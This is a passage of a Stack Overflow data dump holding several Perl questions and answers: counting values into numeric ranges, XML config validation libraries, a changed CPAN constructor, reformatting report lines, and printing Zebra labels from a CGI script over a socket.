{"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 1, "creation_date": 1466240385, "post_id": 37894105, "comment_id": 63243922, "body": "Isn&#39;t that only 75 ranges then, not 750?"}], "answers": [{"tags": [], "owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "is_accepted": false, "score": 2, "last_activity_date": 1466233271, "creation_date": 1466233271, "answer_id": 37894235, "question_id": 37894105, "link": "https://stackoverflow.com/questions/37894105/perl-getting-count-for-range-of-values/37894235#37894235", "title": "Perl: getting count for range of values", "body": "<p>For each value, you can subtract 1, divide by 1000000, and cut off any decimals. That gives you the index of the range as a number between 0 and 749 (inclusive).</p>\n\n<p>Example:</p>\n\n<pre><code>use strict;\nuse warnings;\n\nmy @values = (...);  # filled from somewhere\n\nmy @range_count;\nfor my $value (@values) {\n    my $x = int(($value - 1) / 1e6);\n    $range_count[$x]++;\n}\n</code></pre>\n\n<p>Now <code>$range_count[0]</code> contains the number of values in the first range, <code>$range_count[1]</code> the number of values in the second range, etc.</p>\n\n<p>However, if there were no values in some range, the count will be <code>undef</code>, not 0. If this difference is important, define <code>@range_count</code> as</p>\n\n<pre><code>my @range_count = (0) x 750;\n</code></pre>\n\n<p>instead.</p>\n"}], "owner": {"reputation": 57, "user_id": 5098071, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/903a54b41a713d250f114e1e32e25444?s=128&d=identicon&r=PG&f=1", "display_name": "sangramjit basu", "link": "https://stackoverflow.com/users/5098071/sangramjit-basu"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 122, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1466669572, "creation_date": 1466232264, "last_edit_date": 1466233628, "question_id": 37894105, "link": "https://stackoverflow.com/questions/37894105/perl-getting-count-for-range-of-values", "title": "Perl: getting count for range of values", "body": "<p>I want to perform a count for a range of values, i.e, I have 900 values of X between 1 to 75x10^6. I need to count the number of times these X's fall in range like 1-1000000, 1000001-2000000, 2000001-3000000 ... 750 ranges, then return the counts of these ranges.</p>\n\n<p>I have the values of X stored in an array so I could have done it with for loop and if..else, but giving 750 if-else's is no solution and I don't know how to implement value range in hash-keys. Please help</p>\n\n<p>Thank you in advance :) </p>\n"}, {"tags": ["python", "xml", "perl"], "comments": [{"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1466201561, "post_id": 37890887, "comment_id": 63236681, "body": "How much of this are you expecting from a library?  To parse XMLs nicely and in various ways, yes there are good ones for that, by all means. I wouldn&#39;t expect a library to have this particular functionality. Can you clarify?"}], "answers": [{"comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 1, "creation_date": 1466216700, "post_id": 37891040, "comment_id": 63239618, "body": "On the Perl side, XML::LibXML can be used for schema validation."}], "tags": [], "owner": {"reputation": 1579, "user_id": 3845529, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/yDsDb.jpg?s=128&g=1", "display_name": "kardaj", "link": "https://stackoverflow.com/users/3845529/kardaj"}, "is_accepted": false, "score": 1, "last_activity_date": 1466201219, "creation_date": 1466201219, "answer_id": 37891040, "question_id": 37890887, "link": "https://stackoverflow.com/questions/37890887/comparing-2-objects-in-xml-ideas-needed/37891040#37891040", "title": "Comparing 2 objects in XML, ideas needed", "body": "<p>You can maybe run your <code>xml</code> through an <em>xml schema validation</em> tool. If you're using python, it's supported by the <a href=\"http://lxml.de/validation.html\" rel=\"nofollow\">lxml</a> library. More information on xml schema can be found <a href=\"http://www.w3schools.com/xml/schema_facets.asp\" rel=\"nofollow\">here</a>.</p>\n\n<p>You can also use a library such as <a href=\"https://pypi.python.org/pypi/xmltodict\" rel=\"nofollow\">xmltodict</a> to load your xml data into a python dictionary, then run a <a href=\"http://docs.python-cerberus.org/en/stable/\" rel=\"nofollow\">cerberus</a> validation schema on it.</p>\n"}, {"tags": [], "owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "is_accepted": false, "score": 1, "last_activity_date": 1466204751, "last_edit_date": 1466204751, "creation_date": 1466202659, "answer_id": 37891264, "question_id": 37890887, "link": "https://stackoverflow.com/questions/37890887/comparing-2-objects-in-xml-ideas-needed/37891264#37891264", "title": "Comparing 2 objects in XML, ideas needed", "body": "<p>Perl libraries <a href=\"http://search.cpan.org/~shlomif/XML-LibXML-2.0125/LibXML.pod\" rel=\"nofollow\"><code>XML::LibXML</code></a> and <a href=\"http://search.cpan.org/~mirod/XML-Twig-3.49/Twig.pm\" rel=\"nofollow\"><code>XML::Twig</code></a> are easy to recommend for handling XML. They will parse XML and hand you Perl data structures which you can then work with.</p>\n\n<p>Documentation for <code>XML::LibXML</code>, which provides interface to <code>libxml2</code>, is available in a number of separate pages. You may want to first look at <a href=\"http://search.cpan.org/~shlomif/XML-LibXML-2.0125/lib/XML/LibXML/Reader.pod\" rel=\"nofollow\"><code>XML::LIbXML::Reader</code></a>, a pull-parser which iterates through the document stream as opposed to loading the whole tree, and perhaps the ones on <a href=\"http://search.cpan.org/~shlomif/XML-LibXML-2.0125/lib/XML/LibXML/XPathContext.pod\" rel=\"nofollow\"><code>XPath context</code></a> and <a href=\"http://search.cpan.org/~shlomif/XML-LibXML-2.0125/lib/XML/LibXML/Schema.pod\" rel=\"nofollow\"><code>Schema validation</code></a>.</p>\n\n<p>The <code>XML::Twig</code> can load small documents as a tree, or process \"huge\" ones in a combined stream/tree mode.  It has a lot of (additional) documentation at <a href=\"http://www.xmltwig.org/xmltwig/\" rel=\"nofollow\"><code>xmltwig.org</code></a>.</p>\n\n<p>Both of these modules are full-blown true XML libraries. For one thing, both make good use of <a href=\"http://www.w3schools.com/xsl/xpath_syntax.asp\" rel=\"nofollow\"><code>XPath expressions</code></a>, helping with search through the document for elemens with particular properties or values.</p>\n"}], "owner": {"reputation": 81481, "user_id": 359862, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/ad22374c2202ffcc12b2fdc0e801119d?s=128&d=identicon&r=PG", "display_name": "James Raitsev", "link": "https://stackoverflow.com/users/359862/james-raitsev"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 57, "favorite_count": 0, "closed_date": 1466530502, "answer_count": 2, "score": -1, "last_activity_date": 1466204751, "creation_date": 1466200341, "question_id": 37890887, "link": "https://stackoverflow.com/questions/37890887/comparing-2-objects-in-xml-ideas-needed", "closed_reason": "Not suitable for this site", "title": "Comparing 2 objects in XML, ideas needed", "body": "<p>I am thinking about producing an intelligent report that depicts results of a comparison of <code>n</code> XML config files against a set of rules.</p>\n\n<pre><code>a.b.Default.StartTime=00:00:00\na.b.Default.SomePath:exists\na.b.Default.BeginString:value_a|value_b\n</code></pre>\n\n<p>I am pushing for 3 assertion types:</p>\n\n<ol>\n<li>There is a key that has a particular value</li>\n<li>There is a key that has any value. Key must exists and something must be assigned to it</li>\n<li>There is a key that has either value A or value B</li>\n</ol>\n\n<p><strong>Is there a library I can use to handle this gracefully?</strong></p>\n\n<p>Any direction towards <code>Perl</code>, <code>Python</code> would be most appreciated</p>\n"}, {"tags": ["perl", "cpan", "imlib2"], "answers": [{"tags": [], "owner": {"reputation": 143, "user_id": 4044142, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/a66234cf1b194b76cd5fe1fe8b966e88?s=128&d=identicon&r=PG&f=1", "display_name": "RoflcopterV RoflcopterV", "link": "https://stackoverflow.com/users/4044142/roflcopterv-roflcopterv"}, "is_accepted": false, "score": 1, "last_activity_date": 1466185027, "creation_date": 1466185027, "answer_id": 37887283, "question_id": 37887282, "link": "https://stackoverflow.com/questions/37887282/perl-imageimlib2thumbnailscaled-uneven-number-of-arguments-to-constructor/37887283#37887283", "title": "Perl Image::Imlib2::Thumbnail::Scaled Uneven number of arguments to constructor", "body": "<p>The newest version of Image::Imlib2::Thumbnail::Scaled (0.05) changed the constructor from versions 0.01/0.02/0.03/0.04 to accept hash and now fails on hashref, so any previous code needs to be updated or it will fail.</p>\n\n<p>Ver .05 Documentation:\n<a href=\"http://search.cpan.org/~srchulo/Image-Imlib2-Thumbnail-Scaled-0.05/lib/Image/Imlib2/Thumbnail/Scaled.pm\" rel=\"nofollow\">http://search.cpan.org/~srchulo/Image-Imlib2-Thumbnail-Scaled-0.05/lib/Image/Imlib2/Thumbnail/Scaled.pm</a></p>\n\n<p>Ver .04 Documentation:\n<a href=\"http://search.cpan.org/~srchulo/Image-Imlib2-Thumbnail-Scaled-0.04/lib/Image/Imlib2/Thumbnail/Scaled.pm\" rel=\"nofollow\">http://search.cpan.org/~srchulo/Image-Imlib2-Thumbnail-Scaled-0.04/lib/Image/Imlib2/Thumbnail/Scaled.pm</a></p>\n\n<p>To fix my problem:</p>\n\n<pre><code>my $thumbnail= Image::Imlib2::Thumbnail::Scaled-&gt;new({\n  sizes =&gt; [\n    { width =&gt; 300, height =&gt; 300, name =&gt; 'large' },\n    { width =&gt; 240, height =&gt; 240, name =&gt; 'medium' },\n    { width =&gt; 150, height =&gt; 150, name =&gt; 'small' },\n  ]\n});\n</code></pre>\n\n<p>Changed to:</p>\n\n<pre><code>my $thumbnail= Image::Imlib2::Thumbnail::Scaled-&gt;new(\n  sizes =&gt; [\n    { width =&gt; 300, height =&gt; 300, name =&gt; 'large' },\n    { width =&gt; 240, height =&gt; 240, name =&gt; 'medium' },\n    { width =&gt; 150, height =&gt; 150, name =&gt; 'small' },\n  ]\n);\n</code></pre>\n\n<p>(Removed { and } )</p>\n"}], "owner": {"reputation": 143, "user_id": 4044142, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/a66234cf1b194b76cd5fe1fe8b966e88?s=128&d=identicon&r=PG&f=1", "display_name": "RoflcopterV RoflcopterV", "link": "https://stackoverflow.com/users/4044142/roflcopterv-roflcopterv"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 40, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1466185027, "creation_date": 1466185027, "question_id": 37887282, "link": "https://stackoverflow.com/questions/37887282/perl-imageimlib2thumbnailscaled-uneven-number-of-arguments-to-constructor", "title": "Perl Image::Imlib2::Thumbnail::Scaled Uneven number of arguments to constructor", "body": "<p>After updating a bunch of CPAN modules, ran into this code no longer functioning and throwing an \"Uneven number of arguments to constructor\" error.</p>\n\n<pre><code>use Image::Imlib2::Thumbnail::Scaled;\nmy $thumbnail= Image::Imlib2::Thumbnail::Scaled-&gt;new({\n  sizes =&gt; [\n    { width =&gt; 300, height =&gt; 300, name =&gt; 'large' },\n    { width =&gt; 240, height =&gt; 240, name =&gt; 'medium' },\n    { width =&gt; 150, height =&gt; 150, name =&gt; 'small' },\n  ]\n});\n</code></pre>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1466202568, "post_id": 37887049, "comment_id": 63236966, "body": "You&#39;re trying to process the output of a report program. That&#39;s always wrong: you should use the data directly from the same source that the report program uses"}], "answers": [{"tags": [], "owner": {"reputation": 45481, "user_id": 197758, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/628da6ba2a6c70e35c009b7e3c3a430a?s=128&d=identicon&r=PG", "display_name": "toolic", "link": "https://stackoverflow.com/users/197758/toolic"}, "is_accepted": false, "score": 0, "last_activity_date": 1466184886, "creation_date": 1466184886, "answer_id": 37887234, "question_id": 37887049, "link": "https://stackoverflow.com/questions/37887049/perl-script-to-capture-my-find-and-correct-second-line/37887234#37887234", "title": "Perl Script to capture my find and correct second line", "body": "<p>This prints only the first and last lines between header breaks.  It keeps a buffer of all lines until the next break.  Note that I added a header break at the end.</p>\n\n<pre><code>use warnings;\nuse strict;\n\nmy @lines;\nwhile (&lt;DATA&gt;) {\n    chomp;\n    if (/^-/) {\n        if (@lines) {\n            print @lines[0, -1], \"\\n\";\n        }\n        @lines = ();\n    }\n    else {\n        push @lines, $_;\n    }\n}\n\n__DATA__\n---------------------------------------------------------------------------------\nJT00000000  DOE, JANE              01/23/16            J00000000    1    01/27/16\n              U# NUMBER        UNIT #                                FAIL        \n---------------------------------------------------------------------------------\nJT00000000  DOE, JOHN              01/24/16            J00000000    1    01/28/16\n\n                             CLAIM DETAIL\n\nPATIENT                           ADM/SER   DIS DATE  UNIT #       NUM  BILL DATE \n              CHECKS           DESCRIPTION                           VALUE (FIRST)\n              TOB AFTER        UNIT #                                FAIL         \n----------------------------------------------------------------------------------\nJ000000000  DOE, JOHN              01/25/16  01/31/16  J00000000    1    01/29/16 \n              TXN MISS         UNIT #                                FAIL \n----------------------------------------------------------------------------------\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 0, "last_activity_date": 1466202128, "creation_date": 1466202128, "answer_id": 37891181, "question_id": 37887049, "link": "https://stackoverflow.com/questions/37887049/perl-script-to-capture-my-find-and-correct-second-line/37891181#37891181", "title": "Perl Script to capture my find and correct second line", "body": "\n\n<p>I would write this. It simply skips every line that doesn't start with <code>J0</code> or <code>JT</code>, otherwise it prints the current line and reads and prints the following one</p>\n\n<p>It's almost always simpler to write a program that reads from STDIN and writes to STDOUT. That way you can test it by running</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>$ perl report.pl combined.txt\n</code></pre>\n\n<p>which will print the output to your console, or</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>$ perl report.pl combined.txt &gt; output.txt\n</code></pre>\n\n<p>if you want to write the results to <code>output.txt</code> as your original program does</p>\n\n<pre class=\"lang-perl prettyprint-override\"><code>use strict;\nuse warnings 'all';\n\nwhile ( &lt;&gt; ) {\n\n    next unless /^J[0T]/;\n\n    print;\n    print scalar &lt;&gt;;\n    print \"\\n\";\n}\n</code></pre>\n\n<h3>output</h3>\n\n<pre class=\"lang-none prettyprint-override\"><code>JT00000000  DOE, JANE              01/23/16            J00000000    1    01/27/16\n              U# NUMBER        UNIT #                                FAIL        \n\nJT00000000  DOE, JOHN              01/24/16            J00000000    1    01/28/16\n\n\nJ000000000  DOE, JOHN              01/25/16  01/31/16  J00000000    1    01/29/16 \n              TXN MISS         UNIT #                                FAIL \n</code></pre>\n"}], "owner": {"reputation": 149, "user_id": 3059096, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/d12ffc0cd9482e260f377fa9a3c0f3bb?s=128&d=identicon&r=PG&f=1", "display_name": "PhoenixJay", "link": "https://stackoverflow.com/users/3059096/phoenixjay"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 63, "favorite_count": 0, "answer_count": 2, "score": -2, "last_activity_date": 1466202128, "creation_date": 1466184017, "last_edit_date": 1466201257, "question_id": 37887049, "link": "https://stackoverflow.com/questions/37887049/perl-script-to-capture-my-find-and-correct-second-line", "title": "Perl Script to capture my find and correct second line", "body": "\n\n<p>I have a Perl program that captures the first and second lines of an input file based on a regex match.</p>\n\n<p>In my input file, there are header breaks within the detail I need, and it is not capturing the line I want, so the second line of detail in not there.</p>\n\n<p>Is it possible to alter my program to be able to capture the correct line of detail based on either whitespace or the location of the second line?</p>\n\n<p>If it occurs the header split and second line is always in the same location throughout the file.</p>\n\n<p>Below is the script I have so far, but as I mentioned it does not capture the second line as I want it to when the line has a header split within the detail. </p>\n\n<pre class=\"lang-perl prettyprint-override\"><code>use strict;\n\nmy $find  = '^(J0|JT)';\nmy $match = 0;\n\nopen( NEW,  \"&gt;\", \"output.txt\" )   or die \"could not open:$!\";\nopen( FILE, \"&lt;\", \"combined.txt\" ) or die \"could not open:$!\";\n\nwhile (&lt;FILE&gt;) {\n    chomp;\n\n    if ($match) {\n        $match = 0;\n        print NEW \"$_\\n\";\n    }\n\n    if (/$find/) {\n        $match = 1;\n        print NEW \"$_\";\n    }\n}\nclose(FILE);\nclose(NEW);\n</code></pre>\n\n<h3>combined.txt</h3>\n\n<pre class=\"lang-none prettyprint-override\"><code>---------------------------------------------------------------------------------\nJT00000000  DOE, JANE              01/23/16            J00000000    1    01/27/16\n              U# NUMBER        UNIT #                                FAIL        \n---------------------------------------------------------------------------------\nJT00000000  DOE, JOHN              01/24/16            J00000000    1    01/28/16\n\n                             CLAIM DETAIL\n\nPATIENT                           ADM/SER   DIS DATE  UNIT #       NUM  BILL DATE \n              CHECKS           DESCRIPTION                           VALUE (FIRST)\n              TOB AFTER        UNIT #                                FAIL         \n----------------------------------------------------------------------------------\nJ000000000  DOE, JOHN              01/25/16  01/31/16  J00000000    1    01/29/16 \n              TXN MISS         UNIT #                                FAIL \n</code></pre>\n\n<h3>output.txt (required)</h3>\n\n<pre class=\"lang-none prettyprint-override\"><code>JT00000000  DOE, JANE              01/23/16            J00000000    1    01/27/16 U# NUMBER  UNIT #   FAIL                                      \nJT00000000  DOE, JOHN              01/24/16            J00000000    1    01/28/16 TOB AFTER           FAIL                                      \nJ000000000  DOE, JOHN              01/25/16  01/31/16  J00000000    1    01/29/16 TXN MISS            FAIL \n</code></pre>\n"}, {"tags": ["perl", "cgi", "zebra-printers"], "comments": [{"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 2, "creation_date": 1466255165, "post_id": 37886967, "comment_id": 63247832, "body": "Exactly what unexpected behaviour are you seeing? Is anything being written to the web server error log? Are you sure that both of the servers have access to the printers?"}, {"owner": {"reputation": 193, "user_id": 1112755, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/95fc372320b34cf7caa7b37d6f141267?s=128&d=identicon&r=PG", "display_name": "usr-bin-drinking", "link": "https://stackoverflow.com/users/1112755/usr-bin-drinking"}, "reply_to_user": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 1, "creation_date": 1466432385, "post_id": 37886967, "comment_id": 63300232, "body": "Thanks for the reply. I went in after the weekend to try and gather more information and it works now. The only thing that happened over the weekend is that they reboot the servers but it makes no sense to me why that would fix this issue. I had suspected some sort of firewall type issue but can&#39;t confirm that. I&#39;ve put in a lot more debugging information now and will report back if it happens again."}], "answers": [{"tags": [], "owner": {"reputation": 193, "user_id": 1112755, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/95fc372320b34cf7caa7b37d6f141267?s=128&d=identicon&r=PG", "display_name": "usr-bin-drinking", "link": "https://stackoverflow.com/users/1112755/usr-bin-drinking"}, "is_accepted": false, "score": 1, "last_activity_date": 1471555226, "last_edit_date": 1471555226, "creation_date": 1466523363, "answer_id": 37948772, "question_id": 37886967, "link": "https://stackoverflow.com/questions/37886967/printing-zebra-labels-using-perl-cgi/37948772#37948772", "title": "Printing Zebra Labels using Perl CGI", "body": "<p>It turns out that our Zebra printer is sending a response after printing labels and waiting to verify it was delivered, which locked it up. The solution that is working so far is to get the response but also set a short timeout on the socket just in case. Also went up the food chain and used IO::Socket instead of the old Socket library:</p>\n\n<pre><code>use strict;\nuse IO::Socket;\nuse CGI qw(:cgi-lib);\nuse CGI::Carp qw ( fatalsToBrowser );\nmy %formdata = Vars;\n\nprint \"Content-type: text/html\\r\\n\\r\\n\";\n\n# to test running from the command line, hardcode the paramters normally passed from the web interface\n# comment these out when running CGI\n$formdata{printer} = \"zebralabel1.mycompany.com\";\n$formdata{serials} = \"TR16170003|Gerry's Product TR|This is a generic product where all serial numbers start with the letters TR|T~\";\n\n# create the socket, connect to the port\nmy $remote = IO::Socket::INET-&gt;new(\n                Proto   =&gt; 'tcp',\n                PeerAddr=&gt; \"$formdata{printer}\",\n                PeerPort=&gt; \"9100\",\n                ReuseAddr=&gt; 0,\n                Timeout  =&gt; 2,\n                ) or myExit(\"Cannot connect to printer: $!\");\n$remote-&gt;autoflush(1);  # Send immediately\n\nmy ($serial, $product, $desc) = split(/\\|/, $formdata{serials});\n# example formatted label\nmy $line = qq~^XA^PRA,A,A^LH20,20^FO20,40^FWN^AT,60,10^FD Serial Number: $serial^FS^FO20,120^FWN^AT,60,10^FD Product: $product^FS^FO20,200^FWN^AT,60,10^FD Description: $desc^FS^FO50,280^B3N,N,100,Y,N^FD$serial^FS^XZ~;\n\nprint $remote $line;\nmy $dontCare = &lt;remote&gt;;\n\nclose $remote;\nmyExit(\"Labels Printed.\");\n\nsub myExit\n{\n    my $msg = shift;\n    print \"&lt;script&gt;alert('$msg')&lt;/script&gt;\";\n    exit;\n}\n</code></pre>\n"}], "owner": {"reputation": 193, "user_id": 1112755, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/95fc372320b34cf7caa7b37d6f141267?s=128&d=identicon&r=PG", "display_name": "usr-bin-drinking", "link": "https://stackoverflow.com/users/1112755/usr-bin-drinking"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 242, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1471555226, "creation_date": 1466183659, "last_edit_date": 1466433931, "question_id": 37886967, "link": "https://stackoverflow.com/questions/37886967/printing-zebra-labels-using-perl-cgi", "title": "Printing Zebra Labels using Perl CGI", "body": "<p>I am having issues printing Zebra labels from a Perl CGI, where it works on one server but not another. Also, if I run the program from the command line it works on either server. The servers are IIS 7 (don't laugh it's what I'm stuck using). </p>\n\n<p>Here is the code:</p>\n\n<pre><code>use strict;\nuse Socket;\nuse CGI qw(:cgi-lib);\nuse CGI::Carp qw ( fatalsToBrowser );\nmy %formdata = Vars;\n\nprint \"Content-type: text/html\\r\\n\\r\\n\";\n\n# to test running from the command line, hardcode the paramters normally passed from the web interface\n# comment these out when running CGI\n$formdata{printer} = \"zebraprinter.mycompany.com\";\n$formdata{serials} = \"TR16170003|Gerry's Product TR|This is a generic product where all serial numbers start with the letters TR|T~\";\n\n# initialize server and port\nmy $port = 9100;       \n# create the socket, connect to the port\nsocket(SOCKET,PF_INET,SOCK_STREAM,(getprotobyname('tcp'))[2]) or myExit(\"Can't create a socket $!\\n\");    \nconnect( SOCKET, pack_sockaddr_in($port, inet_aton($formdata{printer}))) or myExit(\"Can't connect to port $port! \\n\");\n\nforeach my $serial(split(\"~\", $formdata{serials}))\n{\n    my @ar = split(/\\|/, $serial);\n    my $line;\n    if ($formdata{printer} =~ /label2/) # small labels\n    {\n        $line = \"^XA^PRA,A,A^LH5,5^FO10,10^BCN,50,N,N,N,D^FD$ar[0]^FS\";\n        $line .= \"^FO300,10^AD,15,12^FDSerial Number:^FS\";\n        $line .= \"^FO300,30^AD,15,12^FD$ar[0]^FS^XZ\";\n    }\n    else # large labels\n    {\n        $line = \"^XA^PRA,A,A^LH20,20\";\n        $line .= \"^FO20,40^FWN^AT,60,10^FD Serial Number: $ar[0]^FS\";\n        $line .= \"^FO20,120^FWN^AT,60,10^FD $ar[1]^FS\";\n\n        # need to hard break and limit long lines\n        if (length($ar[2]) &gt; 60)\n        {\n            my $part = substr($ar[2],0,60);\n            $line .= \"^FO20,200^FWN^AT,60,10^FD Description: $part^FS\";\n            $part = substr($ar[2],61,74);\n            $line .= \"^FO20,260^FWN^AT,60,10^FD$part^FS\";\n            $line .= \"^FO50,340^B3N,N,100,Y,N^FD$ar[0]^FS\";\n        }\n        else\n        {\n            $line .= \"^FO20,200^FWN^AT,60,10^FD Description: $ar[2]^FS\";\n            $line .= \"^FO50,280^B3N,N,100,Y,N^FD$ar[0]^FS\";\n        }\n        $line .= \"^XZ\";\n        # example formatted label\n        #$line = qq~^XA^PRA,A,A^LH20,20^FO20,40^FWN^AT,60,10^FD Serial Number: $ar[0]^FS^FO20,120^FWN^AT,60,10^FD Product: $ar[1]^FS^FO20,200^FWN^AT,60,10^FD Description: $ar[2]^FS^FO50,280^B3N,N,100,Y,N^FD$ar[0]^FS^XZ~;\n    }\n    print SOCKET $line;\n}    \nclose SOCKET;\nmyExit(\"Labels Printed.\");\n\nsub myExit\n{\n    my $msg = shift;\n    print \"&lt;script&gt;alert('$msg')&lt;/script&gt;\";\n    exit;\n}\n</code></pre>\n\n<p>I'm guessing it has something to do with opening sockets in a CGI but I don't have a whole lot of experience with that.</p>\n\n<p>Thanks in advance</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 5923, "user_id": 2105156, "user_type": "registered", "accept_rate": 76, "profile_image": "https://i.stack.imgur.com/oRMc0.jpg?s=128&g=1", "display_name": "fugu", "link": "https://stackoverflow.com/users/2105156/fugu"}, "edited": false, "score": 0, "creation_date": 1466158264, "post_id": 37878796, "comment_id": 63212661, "body": "What&#39;s the error? What&#39;s in <code>DATA1</code>? Where do you declare <code>$String</code>?"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1466158399, "post_id": 37878796, "comment_id": 63212763, "body": "This looks like a copy of <a href=\"http://stackoverflow.com/q/37856440/1331451\">stackoverflow.com/q/37856440/1331451</a>."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 2, "creation_date": 1466158546, "post_id": 37878796, "comment_id": 63212855, "body": "I&#39;ve voted to close this question because we cannot debug code that we do not see. You need to include <b>your real code</b> by <a href=\"https://stackoverflow.com/posts/37878796/edit\">edit</a>ing and copy/pasting the actual, real, live code. Do not type it in again. Do not post something else. Show the real code. No-one can guess what you typed wrong on your computer."}, {"owner": {"reputation": 65, "user_id": 5296508, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1a3662aad9147ac884c90e9987d93a06?s=128&d=identicon&r=PG&f=1", "display_name": "Kajal_T", "link": "https://stackoverflow.com/users/5296508/kajal-t"}, "edited": false, "score": 0, "creation_date": 1466158561, "post_id": 37878796, "comment_id": 63212862, "body": "In other declarations."}, {"owner": {"reputation": 65, "user_id": 5296508, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1a3662aad9147ac884c90e9987d93a06?s=128&d=identicon&r=PG&f=1", "display_name": "Kajal_T", "link": "https://stackoverflow.com/users/5296508/kajal-t"}, "edited": false, "score": 0, "creation_date": 1466158618, "post_id": 37878796, "comment_id": 63212895, "body": "Oh okay Thanks..! I thought it must be some scoping error I cant see..!"}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1466158653, "post_id": 37878796, "comment_id": 63212913, "body": "This code doesn&#39;t even compile. When we say <code>use strict;</code> and <code>use warnings;</code> we mean &quot;...And fix the problems they report&quot;. They&#39;re not breaking your code - they&#39;re just telling you about problems in advance, rather than when you&#39;ll take a week to debug them."}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 1, "creation_date": 1466158786, "post_id": 37878796, "comment_id": 63213000, "body": "There might be - but we can&#39;t see it <i>either</i> because you haven&#39;t provided the code that&#39;s breaking. Or the error. IN THE EXAMPLE you haven&#39;t declared: <code>$String</code>, nor have you opened the <code>DATA1</code> filehandle."}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 3, "creation_date": 